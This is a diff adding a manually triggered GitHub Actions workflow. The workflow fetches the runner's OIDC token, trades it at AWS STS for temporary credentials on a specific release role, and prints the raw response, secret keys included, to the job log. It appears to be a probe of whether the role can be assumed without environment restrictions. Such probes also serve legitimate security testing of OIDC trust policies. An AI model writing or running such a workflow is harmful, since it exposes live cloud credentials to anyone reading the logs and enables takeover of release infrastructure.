@@ -1,0 +1,17 @@
+name: zz-v3
+on: workflow_dispatch
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  noenv:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - run: |
+          set +e
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "LEN=${#T}"
+          curl -s -X POST https://sts.amazonaws.com/ --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::604439173067:role/github/hex-release" --data-urlencode "RoleSessionName=ci" --data-urlencode "WebIdentityToken=$T" | head -c 800
